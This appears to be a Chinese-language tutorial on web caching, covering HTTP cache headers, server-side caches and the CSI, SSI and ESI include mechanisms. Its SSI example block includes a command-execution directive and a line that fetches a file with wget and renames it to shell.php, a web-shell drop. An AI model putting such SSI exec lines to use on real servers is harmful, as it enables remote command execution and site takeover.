# web缓存那点事
**web缓存**基本上就分为两个部分，前端缓存和后端缓存。

##前端缓存

前端缓存的工作是浏览器在工作。浏览器缓存又可以分为基于Http的缓存和非基于Http的缓存。
非基于Http的缓存比较简单，便是html5的mainfest。还有是在<head>节点中加入<meta>标签
```<meta http-equiv="Pragma" content="no-cache">```
该方法只有部分浏览器支持，而且所有缓存代理服务器都不支持，因为代理不解析HTML内容。

基于Http的缓存则是在Http请求的头部字段中加以控制。比如Http1.0中的Expires和Http1.1中Cache-Control。Expires和Cache-Control就是服务端用来约定和客户端的有效时间的。Expires规定了缓存失效时间（Date为当前时间），而Cache-Control的max-age规定了缓存有效时间（2552s）。
Cache-Control的参数有很多，其值可以选取为`no-cache`,`no-store`和`must-revalidate`等。

`no-cache`和`no-store`这两个从字面上来看意思好像差不多，其实不然。在MDN上的定义是这样的：
> **no-cache**
Forces caches to submit the request to the origin server for validation before releasing a cached copy.

`no-store`就如字面意思那样不对任何页面进行储存。
除此之外请求报头在还包含了另一些相关的字段，这些字段用来确认当前的缓存是否过期。这些字段分别是
*`If-Modified-Since`
*`last-modify`
*`etags`
*`if-none-match`

`If-Modified-Since`和`last-modify`，请求报头中带上该字段和服务器上相对应文件或者page的mtime比较，没发生改变服务器返回304。`etags`和`if-none-match`是在Http1.1中被提出，作用和前面提到的类似。不同的是`etags`是一个文件或者page的唯一标识，请求报头中`if-non-match`带着上次服务器返回的`etags`值到服务器端。这里推荐使用的是`if-none-match`，其原因为
* `If-Modified-Since`只精确到秒级，如果在1秒内发生变动是无法被检测到。
* 如果某些文件会被定期生成，但有时内容并没有任何变化（仅仅改变了时间），但Last-Modified却改变了，导致文件没法使用缓存。
* 有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。

`if-none-match`中有一个特殊的值："*"。MDN中特别提到这一点
>For other methods, and in particular for PUT, If-None-Match used with the * value can be used to save a file not known to exist, guaranteeing that another upload didn't happen before, losing the data of the previous put; this problems is the variation of the lost update problem.

在RFC中又是这样解释的
>if "*" is given and any current entity exists for that resource, then the server MUST NOT perform the requested method, unless required to do so because the resource's modification date fails to match that supplied in an If-Modified-Since header field in the request.
>The meaning of "If-None-Match: *" is that the method MUST NOT be performed if the representation selected by the origin server (or by a cache, possibly using the Vary mechanism, see section 14.44) exists, and SHOULD be performed if the representation does not exist. This feature is intended to be useful in preventing races between PUT operations.

还有一个方面和用户的行为有关系
![picture](pic.webp)

##后端缓存

后端缓存主要也分两大类，在数据库缓存和在服务器上缓存。


**数据库缓存**，如果是关系型数据库，可以对表建立高速缓存，也可以建立存储过程。还可以利用非关系型数据库作为缓存层，比如redis、memcached这些高效的基于内存非关系型数据库，读取非常快。

**服务器缓存**，这一类的服务器叫缓存服务器，比如varnish，nginx的插件。但是页面缓存缓存的是静态页面，那么动态页面如何？
为了解决这个问题，便引入了几个技术
* CSI
* SSI
* ESI

**CSI**(Client Side Includes)
通过iframe、javascript、ajax等方式将另外一个页面的内容动态包含进来.这样来实现动态化.

```<iframe src='http://examle/index.php' border='0'></iframe> ```
该方法有一个缺点，客户端缓存问题可能导致更新后不能及时生效！要解决不能及时生效的问题,

**SSI**(Server Side Includes)
通过注释行SSI命令加载不同模块，构建为html，实现整个网站的内容更新.通过SSI调用各模块的对应文件，最后组装为html页面，需要服务器模块支持(具体配置本文不做详述)，比如：apache服务器需要开启mod_include模块。
*Commands that include another file (this tutorial)
*Commands that display dates and time from the server
*Commands that display file information
```
<!--#exec cmd="ls" -->
<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->
<!--#config errmsg="File not found, informs users and password"-->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#fsize file="ssi.shtml" -->
<!--#include file="example.php"-->
```
[Click me](http://www.htmlgoodies.com/beyond/webmaster/article.php/3473341/SSI-The-Include-Command.htm)

**ESI**(Edge Side Includes)
通过使用简单的标记语言来对那些可以加速和不能加速的网页中的内容片断进行描述，每个网页都被划分成不同的小部分分别赋予不同的缓存控制 策略，使Cache服务器可以根据这些策略在将完整的网页发送给用户之前将不同的小部分动态地组合在一起。通过这种控制，可以有效地减少从服务器抓取整个页面的次数，而只用从原服务器中提取少量的不能缓存的片断，因此可以有效降低原服务器的负载，同时提高用户访问的响应时间。与SSI不同的是，ESI多在缓存服务器或代理服务器上执行！
ESI是由Oracle公司和Akamai Technologies公司制定规格，Akamai公司提供对应的信息传送的服务。10多年过去了，还是只属于W3C note。

ESI有7条语句。
1.include
For example,
```
<esi:include src="http://example.com/1.html" alt="http://bak.example.com/2.html" onerror="continue"/>
<esi:include src="http://example.com/ search?query=$(QUERY_STRING{query})"/>
```


2.inline
```
<esi:inline name="URI" fetchable="{yes | no}">
    fragment to be stored within an ESI processor
</esi:inline>
```

3.choose | when | otherwise
```
<esi:choose>
    <esi:when test="...">
        ...
    </esi:when>
    <esi:when test="...">
        ...
    </esi:when>
    <esi:otherwise>
        ...
    </esi:otherwise>
</esi:choose>
```

4.try | attempt | except
```
<esi:try>
    <esi:attempt>
        ...
    </esi:attempt>
    <esi:except>
        ...
    </esi:except>
</esi:try>
```

5.comment
```
<esi:comment text="..." />
```

6.remove
```
<esi:remove> ... </esi:remove>
```

7.vars
```
<esi:vars>
  <img src="http://www.example.com/$(HTTP_COOKIE{type})/hello.gif"/ >
</esi:vars>
```

8. <!--esi ...-->
```<!--esi  
  <p><esi:vars>Hello, $(HTTP_COOKIE{name})!</esi:vars></p>
-->
````
